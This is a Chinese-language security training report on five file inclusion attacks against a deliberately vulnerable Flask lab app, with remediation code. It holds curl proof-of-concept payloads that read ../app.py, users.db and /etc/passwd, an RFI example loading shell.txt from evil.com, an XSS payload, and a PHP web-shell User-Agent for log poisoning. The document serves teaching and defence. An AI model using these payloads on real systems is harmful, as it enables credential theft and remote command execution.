---
title: Day6 — 文件包含漏洞（5种攻击场景）分析与修复报告
date: 2026-07-23
project: 用户登录管理平台安全审计
status: 已完成
---

# 🛡️ Day6 — 文件包含漏洞分析与修复报告

## 一、概述

### 1.1 漏洞范围

本次安全审计针对用户登录管理平台新增的**动态页面加载功能**（`/page?name=`），在一个功能点中实现了 **5 种**经典的 Web 文件包含攻击场景的验证与测试：

| 场景编号 | 漏洞类型 | 对应教材编号 | 攻击原理 |
|:--------:|---------|:------------:|---------|
| S-01 | **基本文件包含** | 1 | `os.path.join` 拼接后直接 `open()` 读取 |
| S-02 | **路径遍历** | 2 | 使用 `../` 突破 pages/ 目录限制 |
| S-03 | **远程文件包含 (RFI)** | 5 | 让 `open()` 变成 `urllib.request.urlopen()` |
| S-04 | **封装协议 (data://)** | 4 | base64 编码内容解码后渲染 |
| S-05 | **日志注入** | 6 | User-Agent → 日志文件 → 包含日志 |

### 1.2 漏洞危害等级

| 漏洞类型 | CVSS 评分 | 严重等级 | CWE 编号 |
|---------|:--------:|:--------:|:--------:|
| 基本文件包含 | — | 🟢 正常功能 | — |
| 路径遍历 | **7.5** | 🔴 **高危** | CWE-22 |
| 远程文件包含 (RFI) | **8.8** | 🔴 **高危** | CWE-829 |
| 封装协议 (data://) | **6.1** | 🟠 **中危** | CWE-73 |
| 日志注入 | **7.5** | 🔴 **高危** | CWE-117 |

### 1.3 核心问题

所有漏洞的**根源**只有一个：用户输入的 `name` 参数被直接用于文件路径拼接和内容读取，**未做任何校验、过滤或规范化**。

```
用户输入 name → os.path.join("pages", name) → open() 读取 → HTML 输出
                ⚠️ 无校验    ⚠️ 无过滤     ⚠️ 无限制
```

---

## 二、漏洞分析与攻击验证

### S-01：基本文件包含

| 属性 | 值 |
|------|-----|
| **漏洞等级** | 🟢 **正常功能** |
| **攻击路径** | `/page?name=help` |
| **源码逻辑** | `os.path.join("pages", "help")` → 读取 `pages/help.html` |

#### 攻击过程

```bash
curl "http://127.0.0.1:5000/page?name=help"
```

#### 结果

**✅ 正常读取**。`pages/help.html` 的内容被渲染在页面中。这是系统预期的正常功能。

---

### S-02：路径遍历（高危）

| 属性 | 值 |
|------|-----|
| **漏洞等级** | 🔴 **高危（High）** |
| **CWE 编号** | CWE-22: Path Traversal |
| **OWASP 映射** | A01:2021 – Broken Access Control |
| **CVSS 3.1** | **7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)** |
| **攻击路径** | `/page?name=../app.py` |

#### 攻击原理

```python
name = "../app.py"
page_path = os.path.join("pages", "../app.py")  # → "pages/../app.py" ← 等价于 "app.py"
open("pages/../app.py").read()  # → ✅ 成功读取到上一级的 app.py！
```

#### 攻击验证

```bash
curl "http://127.0.0.1:5000/page?name=../app.py"
curl "http://127.0.0.1:5000/page?name=../data/users.db"
curl "http://127.0.0.1:5000/page?name=../../etc/passwd"
```

#### 攻击链推演

```
路径遍历 → 读取 app.py（获取密钥和数据库路径）
        → 读取 users.db（获取所有用户凭据）
        → 读取 /etc/passwd（系统用户列表）
        → 搜索配置文件中的数据库密码
```

---

### S-03：远程文件包含 RFI（高危）

| 属性 | 值 |
|------|-----|
| **漏洞等级** | 🔴 **高危（High）** |
| **CWE 编号** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP 映射** | A03:2021 – Injection |
| **CVSS 3.1** | **8.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)** |
| **攻击路径** | `/page?name=http://attacker.com/evil.txt` |

#### 攻击原理

```python
# ⚠️ 漏洞代码：name 以 http 开头时直接发网络请求
if name.startswith("http://") or name.startswith("https://"):
    resp = urllib.request.urlopen(name, timeout=5)
    page_content = resp.read().decode("utf-8")
```

攻击者可以在自己的服务器上放置恶意内容，然后让目标服务器加载并渲染：

```
攻击者服务器:  http://evil.com/shell.txt  ← 放置 ``
目标服务器:    /page?name=http://evil.com/shell.txt
              ↓
目标服务器发起 HTTP 请求到 evil.com
              ↓
获取恶意内容并在页面中渲染
              ↓
XSS / 钓鱼 / 恶意代码执行
```

#### 攻击验证

```bash
# 加载远程页面内容（以自身为例）
curl "http://127.0.0.1:5000/page?name=http://127.0.0.1:5000/page?name=help"
```

#### 实际危害场景

| 攻击场景 | 利用方式 |
|---------|---------|
| **SSRF 内网探测** | 让服务器扫描内网 IP：`http://192.168.1.1/admin` |
| **恶意代码加载** | 加载攻击者服务器的恶意 HTML/JS |
| **数据外传** | RFI 返回的数据中包含窃取的信息 |

---

### S-04：封装协议 data://（中危）

| 属性 | 值 |
|------|-----|
| **漏洞等级** | 🟠 **中危（Medium）** |
| **CWE 编号** | CWE-73: External Control of File Name or Path |
| **CVSS 3.1** | **6.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)** |
| **攻击路径** | `/page?name=data://text/plain;base64,<编码内容>` |

#### 攻击原理

```python
# ⚠️ 漏洞代码：解析 data:// 协议，base64 解码
if name.startswith("data://"):
    if ";base64," in data_part:
        decoded = base64.b64decode(b64_data).decode("utf-8")
        page_content = f"<pre>{decoded}</pre>"
```

data:// 封装协议允许攻击者将任意内容经过 base64 编码后直接嵌入 URL 中：

#### 攻击验证

```bash
# base64 编码 "文件包含漏洞测试成功"
curl "http://127.0.0.1:5000/page?name=data://text/plain;base64,5paH5Lu25YyF5ZCr5rWP5a6e5rWL6K+V5oiQ5Yqf"
```

#### 危害

攻击者可以绕过内容过滤和输入检测，将任意恶意内容通过编码后直接提交：

```
data://text/plain;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
                ↓ base64 解码
<script>alert('XSS')</script>
```

---

### S-05：日志注入（高危）

| 属性 | 值 |
|------|-----|
| **漏洞等级** | 🔴 **高危（High）** |
| **CWE 编号** | CWE-117: Improper Output Neutralization for Logs |
| **攻击路径** | User-Agent 注入 → `/page?name=../logs/access.log` |

#### 攻击原理

```python
# ⚠️ 漏洞代码：未经处理的 User-Agent 直接写入日志文件
@app.before_request
def log_user_agent():
    ua = request.headers.get("User-Agent", "Unknown")
    with open("logs/access.log", "a") as f:
        f.write(f"{ua}\n")
```

攻击分为两步：

**Step 1：注入恶意内容到日志**

```bash
curl -A "INJECTED_PAYLOAD_" http://127.0.0.1:5000/
# User-Agent 被写入 logs/access.log
```

**Step 2：包含日志文件读取注入内容**

```bash
curl "http://127.0.0.1:5000/page?name=../logs/access.log"
# 日志中的 INJECTED_PAYLOAD_ 被读取并显示在页面上
```

#### 攻击验证

```bash
# 1. 注入
curl -A "<?php echo 'LFI_TEST';?>" http://127.0.0.1:5000/

# 2. 包含日志
curl "http://127.0.0.1:5000/page?name=../logs/access.log"
```

#### 攻击链推演

```
攻击者发送请求，User-Agent:
"<?php system($_GET['cmd']);?>"
                ↓
服务器将 User-Agent 写入 access.log
                ↓
攻击者通过 RFI/路径遍历读取 access.log
                ↓
日志中的 PHP 代码被执行
（若服务器支持 PHP 解析）
                ↓
远程命令执行 (RCE)
```

---

## 三、漏洞修复

### 3.1 修复措施

| 编号 | 措施 | 原理 | 对应场景 |
|:----:|------|------|:--------:|
| **F-01** | `../` 和绝对路径检测 | 拒绝 `../`、`/` 开头、`\\` | S-02 路径遍历 |
| **F-02** | 文件名白名单正则 | 只允许 `[a-zA-Z0-9_-]` | S-02/S-04 |
| **F-03** | 拒绝 http/https URL | 不允许远程文件加载 | S-03 RFI |
| **F-04** | 拒绝 data:// 协议 | 不允许封装协议解码 | S-04 data:// |
| **F-05** | 日志内容中性化 | 移除 User-Agent 中的危险字符 | S-05 日志注入 |

### 3.2 修复前（漏洞版）

```python
@app.route("/page")
def dynamic_page():
    name = request.args.get("name", "")

    # ⚠️ 漏洞：支持 RFI
    if name.startswith("http://"):
        resp = urllib.request.urlopen(name)
        page_content = resp.read()
        return ...

    # ⚠️ 漏洞：支持 data:// 封装协议
    if name.startswith("data://"):
        decoded = base64.b64decode(...)
        page_content = f"<pre>{decoded}</pre>"
        return ...

    # ⚠️ 漏洞：直接拼接路径，无路径校验
    page_path = os.path.join(PAGES_DIR, name)
    page_content = open(page_path).read()
```

### 3.3 修复后

```python
@app.route("/page")
def dynamic_page():
    name = request.args.get("name", "")

    # ✅ F-01: 拒绝路径遍历
    if ".." in name or name.startswith("/") or "\\" in name:
        return page_not_found()

    # ✅ F-03/F-04: 拒绝远程请求和封装协议
    if name.startswith("http://") or name.startswith("data://"):
        return page_not_found()

    # ✅ F-02: 白名单校验 — 只允许合法文件名
    if not re.match(r'^[a-zA-Z0-9_-]+$', name):
        return page_not_found()

    # ✅ 安全拼接
    page_path = os.path.join(PAGES_DIR, name)
    ...
```

### 3.4 修复验证

| # | 攻击手法 | 漏洞版 | 修复版 | 防护措施 |
|:--:|---------|:------:|:------:|:--------:|
| 1 | `name=help`（正常） | ✅ 正常 | ✅ 正常 | 白名单通过 |
| 2 | `name=../app.py`（路径遍历） | ✅ **成功** | ❌ **页面不存在** | F-01 + F-02 |
| 3 | `name=http://evil.com`（RFI） | ✅ **成功** | ❌ **页面不存在** | F-03 |
| 4 | `name=data://base64,...`（封装） | ✅ **成功** | ❌ **页面不存在** | F-04 |
| 5 | `name=../logs/access.log`（日志） | ✅ **成功** | ❌ **页面不存在** | F-01 + F-02 |
| 6 | `name=/etc/shadow`（绝对路径） | ✅ **成功** | ❌ **页面不存在** | F-01 |

---

## 四、防御纵深

```
🛡️ 文件包含防御体系

Layer 3: 协议控制
├── F-03: 拒绝 http/https 协议 → 防 RFI
├── F-04: 拒绝 data:// 协议  → 防封装协议攻击
├── F-05: 日志内容中性化     → 防日志注入
└── 禁止 PHP 相关协议（expect:/ftp:）

Layer 2: 路径安全
├── F-01: ../ 和 / 检测     → 防路径遍历
├── F-01: \\ 检测          → 防 Windows 路径穿越
└── 统一路径规范化函数

Layer 1: 输入安全
├── F-02: 正则白名单       → 仅允许合法文件名
├── 拒绝空字符 %00         → 防截断攻击
└── 长度限制               → 防缓冲区溢出
```

---

## 五、项目信息

### 5.1 项目仓库

```
https://github.com/lulu-xuan/security-training
```

### 5.2 快速运行

```bash
cd day6-app && rm -rf data/ logs/ && python3 app.py
```

### 5.3 POC 速查

```bash
# 登录
curl -c /tmp/c.txt -d "username=admin&password=admin123" http://127.0.0.1:5000/login

# 1. 基本文件包含
curl "http://127.0.0.1:5000/page?name=help"

# 2. 路径遍历读取源码
curl "http://127.0.0.1:5000/page?name=../app.py"

# 3. 远程文件包含 (RFI)
curl "http://127.0.0.1:5000/page?name=http://127.0.0.1:5000"

# 4. data://封装协议
echo -n "Injected" | base64
curl "http://127.0.0.1:5000/page?name=data://text/plain;base64,SW5qZWN0ZWQ="

# 5. 日志注入
curl -A "MALICIOUS_PAYLOAD" http://127.0.0.1:5000/
curl "http://127.0.0.1:5000/page?name=../logs/access.log"
```

---

*报告生成日期：2026-07-23 | 项目：Day6 — 文件包含漏洞（5种攻击场景）*
*技术栈：Flask 3.x + SQLite*
*项目仓库：[github.com/lulu-xuan/security-training](https://github.com/lulu-xuan/security-training)*
